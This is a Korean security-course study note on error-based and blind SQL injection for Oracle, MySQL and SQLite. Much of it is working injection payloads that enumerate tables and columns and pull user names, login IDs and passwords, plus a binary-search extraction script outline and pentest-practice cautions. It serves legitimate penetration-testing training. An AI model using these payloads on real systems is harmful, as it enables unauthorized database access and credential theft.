---
title: "SQL Injection - Error-based & Blind 공격 정리"
excerpt: "Error-based와 Blind SQL Injection의 원리와 공격 기법 정리"

categories: ['sk']
typora-root-url: ../../

date: 2026-01-29
last_modified_at: 2026-01-29
published: true
tags: [sk-rookies, sql-injection, error-based, blind-sqli, oracle, mysql, sqlite, pentesting, 모의해킹, SQL인젝션]
---

## 목차

1. [오늘 배운 3가지 공격 기법 비교](#1-오늘-배운-3가지-공격-기법-비교)
2. [Error-based SQL Injection](#2-error-based-sql-injection)
3. [Blind SQL Injection](#3-blind-sql-injection)
4. [논리 연산의 중요성](#4-논리-연산의-중요성)
5. [실무 주의사항](#5-실무-주의사항)
6. [DB별 핵심 문법](#6-db별-핵심-문법)
7. [실습 문제 접근 순서](#7-실습-문제-접근-순서)

---

## 1. 오늘 배운 3가지 공격 기법 비교

| 공격 기법 | 한번에 추출 가능한 데이터 | 난이도 | 속도 |
|---------|------------------------|--------|------|
| **Union-based** | 여러 Row + 여러 Column | 중 | ⚡⚡⚡ 빠름 |
| **Error-based** | 1 Row + 1 Column | 중상 | ⚡⚡ 보통 |
| **Blind** | 1 Row + 1 Column + 1 Char | 상 | ⚡ 느림 |

---

## 2. Error-based SQL Injection

### 핵심 개념

**일부러 에러를 발생시켜서 에러 메시지 안에 데이터베이스 정보를 출력하게 만드는 방법**

### Oracle DB 공격 방법

#### 1단계: 공격 가능 여부 확인

```sql
검색어: '
→ 에러 메시지가 보이면 공격 가능!
→ 500 에러나 "에러가 났습니다" 같은 일반 메시지는 X
→ WAS 내부 에러 메시지(ORA-XXXX)가 보여야 함
```

#### 2단계: 마법의 주문 사용

```sql
검색어: 김%' and CTXSYS.DRITHSX.SN(user,'hacker') ='j

결과 에러 메시지:
ORA-20000: Oracle Text 오류:
DRG-11701: hacker 키워드 사전이 존재하지 않습니다
```

**핵심 포인트:**
- `'hacker'` 부분에 서브쿼리를 넣으면 그 결과가 에러 메시지에 출력됨!
- 반드시 **1 row, 1 column** 데이터만 추출 가능

#### 3단계: 정보 수집 시퀀스

**테이블 정보 수집**

```sql
-- 테이블 개수 확인
검색어: 김%' and CTXSYS.DRITHSX.SN(user,(select count(table_name) from user_tables)) ='j

에러 메시지: DRG-11701: 6 키워드 사전이 존재하지 않습니다
→ 테이블이 6개 있다는 의미!

-- 첫 번째 테이블 이름 확인
검색어: 김%' and CTXSYS.DRITHSX.SN(user,(select j from (select table_name j, rownum k from user_tables) where k = 1)) ='j

에러 메시지: DRG-11701: FRIENDS 키워드 사전이 존재하지 않습니다
→ 첫 번째 테이블은 'FRIENDS'

-- 두 번째, 세 번째... (k = 2, k = 3...)
```

**컬럼 정보 수집**

```sql
-- 컬럼 개수 확인
검색어: 김%' and CTXSYS.DRITHSX.SN(user,(select count(column_name) from user_tab_columns where table_name = 'MEMBER')) ='j

-- 컬럼 이름들을 한번에 확인 (꿀팁!)
검색어: 아무것도안나와%' and CTXSYS.DRITHSX.SN(user,(select LISTAGG(column_name, ', ') WITHIN GROUP (ORDER BY 1) from cols where table_name = 'MEMBER')) ='j

에러 메시지: DRG-11701: USER_NM, LOGIN_ID, PASS, EMAIL 키워드 사전이...
→ 한번에 모든 컬럼명 확인!
```

**Tip:** 검색어를 아무것도 안 나오는 값으로 시작하면 에러만 깔끔하게 볼 수 있음!

**데이터 추출**

```sql
-- 데이터 개수 확인
검색어: 김%' and CTXSYS.DRITHSX.SN(user,(select count(USER_NM) from MEMBER)) ='j

-- 데이터 하나씩 추출
검색어: 김%' and CTXSYS.DRITHSX.SN(user,(select user_nm from (select user_nm, rownum a from member) where a = 1)) ='j

-- 여러 컬럼을 한번에 (concat 사용)
검색어: 김%' and CTXSYS.DRITHSX.SN(user,(select concat(user_nm,',',login_id,',',email,',',pass) from member where rownum=1)) ='j
```

### MySQL 공격 방법

#### 마법의 주문: extractvalue

```sql
검색어: CCC%' and extractvalue('1', concat(0x3a, (select 'hacker2')))='j%

-- 테이블 개수
검색어: CCC%' and extractvalue('1', concat(0x3a, (select count(table_name) from information_schema.tables where table_schema = database())))='j%

-- 첫 번째 테이블 이름
검색어: CCC%' and extractvalue('1', concat(0x3a, (select table_name from information_schema.tables where table_schema = database() limit 0,1)))='j%

-- 두 번째 테이블 이름
검색어: CCC%' and extractvalue('1', concat(0x3a, (select table_name from information_schema.tables where table_schema = database() limit 1,1)))='j%
```

**핵심:**
- `0x3a`는 콜론(:)의 16진수 표현
- `limit 0,1`: 첫 번째 1개
- `limit 1,1`: 두 번째 1개

---

## 3. Blind SQL Injection

### 핵심 개념

**화면에 결과가 전혀 안 보이는 상황에서 참/거짓 반응만으로 정보를 알아내는 방법**

- 마치 **"스무고개" 게임** 또는 **"업다운 게임"** 같은 방식
- 가장 어렵지만 가장 많이 사용되는 기법

### 기본 원리

```sql
-- 참인 경우: 검색 결과가 나옴
검색어: 하하%' and 1=1 and 'q%'='q
→ 데이터가 화면에 표시됨

-- 거짓인 경우: 검색 결과가 안 나옴
검색어: 하하%' and 1=2 and 'q%'='q
→ 아무것도 안 나옴

-- 이 차이를 이용해서 정보를 알아냄!
```

### Oracle DB 공격 방법

#### 1단계: 글자 수 세기

```sql
-- 현재 사용자 이름이 3글자보다 큰지?
검색어: 523%' and (select length(user) from dual) > 3 and 'k%'='k
→ 결과 나오면 3글자 초과
→ 안 나오면 3글자 이하

-- 4글자보다 큰지?
검색어: 523%' and (select length(user) from dual) > 4 and 'k%'='k
→ 안 나오면 정확히 4글자!
```

#### 2단계: 한 글자씩 ASCII 값 알아내기 (업다운 게임)

```sql
-- 첫 번째 글자의 ASCII 값이 80보다 큰지?
검색어: 523%' and (select ascii(substr(user,1,1)) from dual) > 80 and 'k%'='k
→ 나옴 → UP! (80보다 큼)

-- 90보다 큰지?
검색어: 523%' and (select ascii(substr(user,1,1)) from dual) > 90 and 'k%'='k
→ 안 나옴 → DOWN! (90보다 작음)

-- 85보다 큰지?
검색어: 523%' and (select ascii(substr(user,1,1)) from dual) > 85 and 'k%'='k
→ 안 나옴 → DOWN! (85보다 작음)

-- 82보다 큰지?
검색어: 523%' and (select ascii(substr(user,1,1)) from dual) > 82 and 'k%'='k
→ 안 나옴 → DOWN!

-- 82랑 같은지?
검색어: 523%' and (select ascii(substr(user,1,1)) from dual) = 82 and 'k%'='k
→ 나옴! → 정답은 82

-- ASCII 82 = 'R'
```

#### 3단계: 모든 글자 반복

```sql
-- 두 번째 글자
검색어: 523%' and (select ascii(substr(user,2,1)) from dual) > 80 and 'k%'='k

-- 세 번째 글자
검색어: 523%' and (select ascii(substr(user,3,1)) from dual) > 80 and 'k%'='k

-- 네 번째 글자
검색어: 523%' and (select ascii(substr(user,4,1)) from dual) > 80 and 'k%'='k
```

**예시 결과:**
```
1번째 글자: ASCII 73 = 'I'
2번째 글자: ASCII 78 = 'N'
3번째 글자: ASCII 70 = 'F'
4번째 글자: ASCII 54 = '6'

→ 사용자 이름: INF6
```

### MySQL 공격 방법

```sql
-- 글자 수
검색어: admin%' and (select length(user())) > 3 and 'k%'='k

-- 첫 번째 글자 ASCII 값
검색어: admin%' and (select ascii(substring(user(),1,1))) > 80 and 'k%'='k

-- 두 번째 글자
검색어: admin%' and (select ascii(substring(user(),2,1))) > 80 and 'k%'='k
```

**차이점:**
- Oracle: `substr(문자열, 시작, 길이)`
- MySQL: `substring(문자열, 시작, 길이)`

### 💡 Blind 공격 효율 팁

1. **이진 탐색 (Binary Search) 사용**
   ```
   ASCII 범위: 1~127

   중간값 64로 시작
   → 크면: 65~127 범위에서 중간값 96
   → 작으면: 1~63 범위에서 중간값 32
   → 반복...

   최대 7번이면 찾을 수 있음! (2^7 = 128)
   ```

2. **손으로 하는 게 Intruder보다 빠름**
   - Intruder는 1부터 127까지 순서대로 시도 (최악의 경우 127번)
   - 손으로 업다운 게임 방식은 최대 7번!

---

## 4. 논리 연산의 중요성

### 중요한 개념: AND 연산자의 특성

```sql
-- AND는 모두 참이어야 실행
select * from friends where name='하하' AND 1=1 AND 1=1
→ 모든 조건이 참이면 결과 나옴

-- 하나라도 거짓이면 뒤는 실행조차 안 함!
select * from friends where name='존재안하는이름' AND (복잡한 쿼리)
→ 첫 번째가 거짓이므로 (복잡한 쿼리)는 실행되지 않음!
```

### 실전에서 자주 하는 실수

```sql
-- 잘못된 예
검색어: qwe%' and (복잡한쿼리) and 'k%'='k
→ 'qwe'가 DB에 없으면 뒤의 쿼리가 실행 안 됨!
→ 아무 결과도 안 나옴

-- 올바른 예
검색어: 아무거나%' and (복잡한쿼리) and 'k%'='k
→ 최소한 1개 row라도 있는 검색어 사용!
→ 참/거짓 차이를 확인할 수 있음
```

### 테스트 순서

```sql
1. 먼저 정상 검색어로 데이터가 나오는지 확인
   검색어: 하하
   → 결과 나옴 ✓

2. 항상 참인 조건 추가
   검색어: 하하%' and 1=1 and 'k%'='k
   → 결과 나옴 ✓ (정상 작동)

3. 항상 거짓인 조건 추가
   검색어: 하하%' and 1=2 and 'k%'='k
   → 결과 안 나옴 ✓ (Blind 공격 가능!)

4. 실제 공격 쿼리 삽입
   검색어: 하하%' and (공격쿼리) and 'k%'='k
```

---

## 5. 실무 주의사항

### 절대 하지 말아야 할 것

#### 1. **SQLMap 같은 자동화 툴 사용 금지**

```
이유:
- 실무에서 사용하면 즉시 퇴출
- 페이로드를 마구 날려서 서버 부하 유발
- 통제 불가능한 공격 패턴
- 담당자가 로그 보면 바로 티남

해결책:
- Python으로 직접 스크립트 작성
- 페이로드 제어 가능
- 요청 속도 조절 가능
```

#### 2. **Time-based Blind Injection 사용 금지**

```sql
-- 사용하지 말 것!
검색어: admin' and sleep(5)--
검색어: admin' and benchmark(10000000,sha1('test'))--
검색어: admin' and if(조건,sleep(5),0)--
```

```
이유:
- 소규모 서버는 DB가 다운될 수 있음
- 실제로 사고 사례가 있음
- 서버에 과부하 발생
- 허니팟(Honeypot)에 걸릴 수 있음

대안:
- 일반 Blind Injection 사용 (참/거짓 판별)
- OOB(Out-of-Band) 테스트 (공격자 서버 활용)
```

#### 3. **Intruder로 무작위 대입 금지**

```
문제점:
- ASCII 1~127까지 순서대로 시도
- 최악의 경우 127번 요청
- 느리고 비효율적

대안:
- 손으로 이진 탐색 (Binary Search)
- 최대 7번이면 찾을 수 있음
```

### 올바른 접근 방법

#### 1. **취약점 진단 레벨**

```
레벨 1 (기본):
검색어: ' or 1=1--
검색어: ' and 1=2--
→ 참/거짓 차이만 확인하고 종료
→ "SQL Injection 취약점 존재" 보고서 작성

레벨 2 (중급):
→ 사용자 이름(user)까지만 추출
→ POC(Proof of Concept) 제시

레벨 3 (고급):
→ 전체 데이터 탈취
→ 실무에서는 하지 않음! (레드팀/해킹만)
```

#### 2. **Python 자동화 스크립트 작성**

```python
# 예시 구조 (실제 코드 작성 필요)
import requests

def blind_sql_injection(url, param):
    # 1. 글자 수 확인
    length = find_length(url, param)

    # 2. 각 글자의 ASCII 값 찾기 (이진 탐색)
    result = ""
    for i in range(1, length + 1):
        ascii_value = binary_search(url, param, i)
        result += chr(ascii_value)

    return result

def binary_search(url, param, position):
    low, high = 32, 126

    while low <= high:
        mid = (low + high) // 2
        # 참/거짓 테스트
        if test_condition(url, param, position, mid):
            low = mid + 1
        else:
            high = mid - 1

    return high
```

---

## 6. DB별 핵심 문법

### Oracle

```sql
-- 현재 사용자
select user from dual

-- 현재 DB 이름
select ora_database_name from dual

-- 테이블 목록
select table_name from user_tables

-- 컬럼 목록
select column_name from user_tab_columns where table_name = '테이블명'

-- 문자열 자르기
substr(문자열, 시작위치, 개수)
substr('ABCD', 1, 1)  -- 'A'
substr('ABCD', 2, 1)  -- 'B'
substr('ABCD', 0, 1)  -- 'A' (0도 1도 첫 글자)

-- ASCII 변환
ascii('A')  -- 65
ascii('a')  -- 97

-- 문자 길이
length(문자열)
length('hello')  -- 5

-- 여러 값 합치기
concat('a', 'b')  -- 'ab' (2개만 가능)

-- 여러 컬럼을 쉼표로 연결
LISTAGG(column_name, ', ') WITHIN GROUP (ORDER BY 1)

-- Row 번호
rownum

-- 서브쿼리 예시
select j from (
    select table_name j, rownum k
    from user_tables
) where k = 1
```

### MySQL

```sql
-- 현재 사용자
user()
-- 또는
current_user()

-- 현재 DB 이름
database()

-- 테이블 목록
select table_name
from information_schema.tables
where table_schema = database()

-- 컬럼 목록
select column_name
from information_schema.columns
where table_name = '테이블명'

-- 문자열 자르기
substring(문자열, 시작위치, 개수)
substring('ABCD', 1, 1)  -- 'A'
substring('ABCD', 2, 1)  -- 'B'

-- ASCII 변환
ascii('A')  -- 65

-- 문자 길이
length(문자열)
-- 또는
char_length(문자열)

-- 여러 값 합치기
concat('a', 'b', 'c')  -- 'abc' (여러 개 가능)

-- 개수 제한
limit 0, 1  -- 첫 번째 1개
limit 1, 1  -- 두 번째 1개
limit 2, 1  -- 세 번째 1개
```

### SQLite

```sql
-- 테이블 목록
select name from sqlite_master where type='table'

-- 컬럼 목록
PRAGMA table_info(테이블명)

-- 문자열 자르기
substr(문자열, 시작위치, 개수)

-- ASCII 변환
unicode('A')  -- 65 (ascii 대신 unicode 사용)

-- 문자 길이
length(문자열)

-- 여러 값 합치기
문자열1 || 문자열2  -- SQLite는 || 연산자 사용

-- 개수 제한
limit 1 offset 0  -- 첫 번째
limit 1 offset 1  -- 두 번째
```

---

## 7. 실습 문제 접근 순서

### 표준 공격 시퀀스

```
1. 쿼리문 유추
   ↓
2. 공격 포인트 찾기
   ↓
3. 공격 기법 선택
   ↓
4. 테이블 정보 수집
   ↓
5. 컬럼 정보 수집
   ↓
6. 데이터 추출
```

### 1. 쿼리문 유추

```sql
게시판 검색 기능이라면?
→ select 제목, 작성자, 내용 from 게시판 where 제목 like '%검색어%'

로그인 기능이라면?
→ select * from users where id='입력값' and pw='입력값'

상품 검색이라면?
→ select * from products where name like '%검색어%'
```

**팁:** 기능을 보고 어떤 쿼리가 실행될지 상상해보기!

### 2. 공격 포인트 찾기

```sql
테스트 1: 작은따옴표 입력
검색어: '
→ 에러 메시지 보임? → Error-based 가능!
→ 결과만 달라짐? → Blind 가능!
→ 아무 반응 없음? → 다른 파라미터 시도

테스트 2: 논리 연산
검색어: ' or 1=1--
검색어: ' and 1=1--
검색어: ' and 1=2--
→ 결과 차이 확인

테스트 3: Union 테스트
검색어: ' union select null--
검색어: ' union select null,null--
→ 컬럼 개수 찾기
```

### 3. 공격 기법 선택

```
Error 메시지 보임?
→ Error-based 사용 (가장 빠름)

결과 차이만 있음?
→ Blind 사용 (느리지만 확실)

Union 가능?
→ Union-based 사용 (가장 효율적)
```

### 4. 테이블 정보 수집

**Error-based (Oracle):**
```sql
-- 개수
검색어: 아무거나%' and CTXSYS.DRITHSX.SN(user,(select count(table_name) from user_tables)) ='j

-- 이름
검색어: 아무거나%' and CTXSYS.DRITHSX.SN(user,(select j from (select table_name j, rownum k from user_tables) where k = 1)) ='j
```

**Blind (Oracle):**
```sql
-- 개수
검색어: 하하%' and (select count(table_name) from user_tables) > 5 and 'k%'='k

-- 첫 번째 테이블 이름 길이
검색어: 하하%' and (select length(j) from (select table_name j, rownum k from user_tables) where k = 1) > 5 and 'k%'='k

-- 첫 번째 테이블의 첫 글자
검색어: 하하%' and (select ascii(substr(j,1,1)) from (select table_name j, rownum k from user_tables) where k = 1) > 70 and 'k%'='k
```

### 5. 컬럼 정보 수집

**Error-based (Oracle):**
```sql
-- 한번에 모든 컬럼명 보기 (추천!)
검색어: 아무거나%' and CTXSYS.DRITHSX.SN(user,(select LISTAGG(column_name, ', ') WITHIN GROUP (ORDER BY 1) from cols where table_name = 'MEMBER')) ='j

-- 하나씩 보기
검색어: 아무거나%' and CTXSYS.DRITHSX.SN(user,(select c from (select column_name c, rownum r from user_tab_columns where table_name = 'MEMBER') where r = 1)) ='j
```

**Blind (Oracle):**
```sql
-- 컬럼 개수
검색어: 하하%' and (select count(column_name) from user_tab_columns where table_name = 'MEMBER') > 20 and 'k%'='k

-- 첫 번째 컬럼명의 첫 글자
검색어: 하하%' and (select ascii(substr(c,1,1)) from (select column_name c, rownum r from user_tab_columns where table_name = 'MEMBER') where r = 1) > 80 and 'k%'='k
```

### 6. 데이터 추출

**Error-based (Oracle):**
```sql
-- 사용자 이름
검색어: 아무거나%' and CTXSYS.DRITHSX.SN(user,(select user_nm from (select user_nm, rownum a from member) where a = 1)) ='j

-- 여러 컬럼 한번에
검색어: 아무거나%' and CTXSYS.DRITHSX.SN(user,(select user_nm||','||login_id||','||pass from member where rownum=1)) ='j
```

**Blind (Oracle):**
```sql
-- 데이터 개수
검색어: 하하%' and (select count(*) from member) > 100 and 'k%'='k

-- 첫 번째 사용자 이름의 첫 글자
검색어: 하하%' and (select ascii(substr(user_nm,1,1)) from (select user_nm, rownum a from member) where a = 1) > 80 and 'k%'='k
```

---

## 초급자를 위한 최종 팁

### 1. 항상 0으로 먼저 테스트

```sql
검색어: 김%' and 0 and 'k%'='k
→ 아무것도 안 나와야 정상

검색어: 김%' and 1 and 'k%'='k
→ 결과가 나와야 정상

이게 안 되면 쿼리문이 틀렸거나 공격이 안 되는 것!
```

### 2. 한 단계씩 확인

```
테이블 → 컬럼 → 데이터 순서를 꼭 지키기!
중간에 건너뛰면 나중에 막힘
```

### 3. 에러 메시지는 친구

```
에러가 많은 정보를 알려줌
천천히 읽어보고 분석하기
에러 코드를 구글에 검색해보기
```

### 4. 결과를 꼭 기록

```
각 단계마다 결과를 메모하기:
- 테이블명: FRIENDS, MEMBER, BOARD
- MEMBER 테이블 컬럼: USER_NM, LOGIN_ID, PASS, EMAIL
- 첫 번째 사용자: 홍길동, admin, 5f4dcc3b...
```

### 5. Blind는 인내심

```
느리고 반복적이지만 가장 확실한 방법
자동화 스크립트 짜기 전에 손으로 1-2개 해보기
원리를 이해하면 스크립트 짜기 쉬움
```

---

## 추가 학습 자료

### ASCII 코드표 (자주 사용하는 것들)

```
숫자:
48='0', 49='1', ... 57='9'

대문자:
65='A', 66='B', ... 90='Z'

소문자:
97='a', 98='b', ... 122='z'

특수문자:
32=' ', 45='-', 46='.', 64='@', 95='_'
```

### 이진 탐색 예시

```
찾고자 하는 값: 73 ('I')
범위: 1~127

1단계: mid = 64
   73 > 64? Yes → 범위를 65~127로 좁힘

2단계: mid = 96
   73 > 96? No → 범위를 65~95로 좁힘

3단계: mid = 80
   73 > 80? No → 범위를 65~79로 좁힘

4단계: mid = 72
   73 > 72? Yes → 범위를 73~79로 좁힘

5단계: mid = 76
   73 > 76? No → 범위를 73~75로 좁힘

6단계: mid = 74
   73 > 74? No → 범위를 73~73으로 좁힘

7단계: 73 = 73? Yes → 정답!

총 7번만에 찾음!
```

---

## 체크리스트
- [ ] 1. 쿼리문 유추했는가?
- [ ] 2. `'` 입력으로 공격 포인트 찾았는가?
- [ ] 3. 공격 기법 선택했는가? (Error/Blind/Union)
- [ ] 4. 테이블 개수 확인했는가?
- [ ] 5. 모든 테이블 이름 추출했는가?
- [ ] 6. 목표 테이블의 컬럼 개수 확인했는가?
- [ ] 7. 모든 컬럼 이름 추출했는가?
- [ ] 8. 데이터 개수 확인했는가?
- [ ] 9. 필요한 데이터 추출했는가?
- [ ] 10. 결과를 기록했는가?
